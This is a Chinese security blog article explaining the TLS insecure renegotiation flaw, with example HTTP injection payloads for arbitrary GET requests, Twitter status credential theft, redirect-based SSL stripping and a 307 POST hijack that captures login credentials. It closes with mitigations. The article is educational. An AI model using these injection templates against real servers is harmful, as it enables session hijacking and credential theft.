> 原文链接: https://www.anquanke.com//post/id/82989 


# SSL/TLS协议安全之:不安全的重协商


                                阅读量   
                                **367772**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**Author: Windcarp**

**稿费：500**

**<br>**

**0x00 背景**

这些年来,SSL/TLS协议的安全性一直是国内外安全研究者研究的重点。在近些年里,针对TLS的漏洞,出现了很多种攻击,如2009年的InSecure Renegotiation(不安全的重协商),2011年的BEAST攻击,2012年的CRIME攻击,以及2013年的Lucky 13,RC4 biases,TIME和BREACH,还有2014年的贵宾犬Poodle攻击。

我们知道,在SSL3.0中引入了支持密码学参数的重协商的特性。当Client或者Server请求重新谈判时,将会有一次新的握手过程,以协商新的安全参数。

这一切看起来都没有问题,但是安全研究者们仍然发现了安全问题,这就是我们今天讨论的主题:Insecure Renegotiation。

<br>

**0x01 重协商安全**

这个安全问题的起因在于,应用层和加密传输层因为分层的设计,几乎没有互动。举个例子来说,重协商可以发生在一次HTTP请求过程的中间,但应用层并不知晓。

此外,还有可能的一种情况是,Web服务器会将重协商之前的接收数据缓存,和重协商之后的数据一起转发给应用服务器。当然重协商之后参数会发生变化,如可能使用了不同的客户端证书,从而最终导致了TLS和Web应用出现mismatch(不协调)。

**攻击流程:**

攻击者拦截受害者到服务器的Handshake请求包

攻击者新建一个TCP连接到服务器(SSL)以发送Payload

接下来,攻击者将第一步拦截下来的包发出去。对于服务器来说,以为受害者发起了重协商请求,所以重新建立了TLS连接,但是却忽视了数据的完整性,将两次数据接在一起,从而造成了有害数据的注入。

示意图如下。这里我们示意其对HTTP GET请求的一次注入过程。

[![](https://p1.ssl.qhimg.com/t0151e12133bb6b67b4.png)](https://p1.ssl.qhimg.com/t0151e12133bb6b67b4.png)

通过重放Client(victim)的重协商请求包,我们发起攻击。利用的前提条件是找到一个触发重协商的点。当然如果有用户主动发起重协商是最好不过的,如果一些网站在某些条件下需要重协商,攻击者也可以加以利用。

<br>

**0x02 攻击的利用:HTTP**

利用不安全的重协商,其攻击的影响主要取决于底层协议和服务器的实现,攻击HTTP是最容易想到的一种利用,这种攻击存在很多变体,Thierry Zoller对HTTP攻击提出了攻击向量与POC。

**任意GET命令执行**

1、这是最简单的攻击,举个例子吧:



```
GET /PATH/TO/RESOURCE.jsp HTTP/1.0
X-Ignore: GET /index.jsp HTTP/1.0
Cookie: JSESSIONID=BASD429ERTLKP09W3P0932K
```

这就是我们前面注入的Payload。

攻击者虽然借用了受害者的身份凭证等机密信息访问了任意GET,但是攻击者不可能获得返回的结果,这种效果和CSRF攻击的效果比较像。

2.凭证盗窃

访问中比较重要的信息就是Cookie、Session等凭证信息,也是攻击者瞄准的重点。Anil在Twitter(这是什么网XD)上提出了这种攻击:



**POST /statuses/update.xml HTTP/1.0**

**Authorization: Basic [attacker's credentials]**

**Content-Type: application/x-www-form-urlencoded**

**Content-Length: [estimated body length]**

```
status=POST /statuses/update.xml HTTP/1.1
Authorization: Basic [victim's credentials]
```

加粗部分是我们的Payload。前一阵很流行用思聪老公的号发微博,这个正好相反。

3.用户重定向

如果攻击者可以发现攻击目标网站有一些用户重定向的存在,那么攻击就更加有意思了,Mikhail对此进行了一些探索:

1 将用户重定向到恶意网站

如果我们发现的重定向点可以将参数回放到返回重定向的Location字段,那么我们可以很容易将用户重定向到恶意网站,不过这种情况并不多见。

2 降级劫持

如果重定向的点是不受HTTPS保护的plaintext web site,那么TCP连接便会暴露,我们即可以通过SSLSTRIP的方式劫持受害者的访问。



```
GET /Some300Resource HTTP/1.1
Connection:close
Host:virtualhost2.com
rnrn
GET /clientsoriginalrequest HTTP 1.1
Host:bank.com
```

3 POST 劫持

如果返回307状态的用户跳转的话,代表着服务器要求浏览器以和本次访问一样的Request访问跳转的内容。<br>我们来看下面的攻击过程:



```
MITM-&gt;Bank.com:443
POST /some307resource HTTP/1.1
X-Ignore: POST /login.jsp HTTP/1.1
Host: Bank.com
Content-Length: 100
username = windcarp&amp;password=secretmsg
rnrn
Client&lt;-Bank.com:443
307 OK HTTP/1.1
Location: http://www.plaintext.com/PostComment
rnrn
Client-&gt;MITM:80-&gt;plaintext.com:80
POST /PostComment HTTP/1.1
Host: plaintext.com
Content-Length: 100
username = windcarp&amp;password=secretmsg
rnrn
```

在这一步,攻击者作为中间人已经可以获得受害者的账户密码。

```
Client&lt;-MITM:80
307 OK HTTP/1.1
Location: https://www.bank.com/login.jsp
rnrn
Client-&gt;Bank.com:443
POST /login.jsp HTTP/1.1
Host: Bank.com
Content-Length: 100
username = windcarp&amp;password=secretmsg
rnrn
```

为了使攻击伪装的更好,我们用一个307跳转跳转回bank登陆,看起来什么都没有发生,但是攻击已经成功。

4 其他

TRACE http请求需要server将request放在response中原样返回。如果这种情况出现我们就可以控制返回包中的一些内容。有趣的是,有些小众的浏览器可以以http格式解析包头中的内容从而造成XSS。

<br>

**0x03 其他协议**

针对SMTP和FTP两种协议也存在着攻击的理论可能。

对于SMTP,Wietse Venema针对Postfix做了研究,但是侥幸的是,因为一些实现的问题,导致这个漏洞并不会被触发。与此同时,SMTP本身安全性过差导致这个漏洞没有很大的价值。

对于FTP,则可以利用这个漏洞达到TELL SERVER DISABLE ENCRYPTION的效果,之后所有的数据就会取消加密,从而造成信息泄露的问题。

<br>

**0x04 结语**

解决不安全的重协商这种攻击在起初时给出了两个思路:

升级到支持安全的重协商

直接关闭重协商的选项

不用分析,两种方法高下立判。当然,在新版本的传输层安全协议中这个问题已经得到了很好的解决,但是漏洞与攻击思路,在我们今天的安全研究中仍可以起到一些借鉴作用。

Reference

[1]MITM attack on delayed TLS-client auth through renegotiation<br>

[http://www.ietf.org/mail-archive/web/tls/current/msg03928.html](http://www.ietf.org/mail-archive/web/tls/current/msg03928.html)<br>

[2]TLS/SSLv3 renegotiation vulnerability explained<br>

[http://www.g-sec.lu/tools.html](http://www.g-sec.lu/tools.html)<br>

[3]TLS renegotiation vulnerability: definitely not a full blown MITM, yet more than just a simple CSRF<br>

[http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html](http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html)<br>

[4]Generalization of the TLS Renegotiation Flaw Using HTTP 300 Redirection to Effect Cryptographic Downgrade Attacks b284<br>

[http://www.leviathansecurity.com/white-papers/tls-and-ssl-man-in-the-middle-vulnerability/](http://www.leviathansecurity.com/white-papers/tls-and-ssl-man-in-the-middle-vulnerability/)<br>

[5]Google<br>

[http://www.google.com](http://www.google.com/)
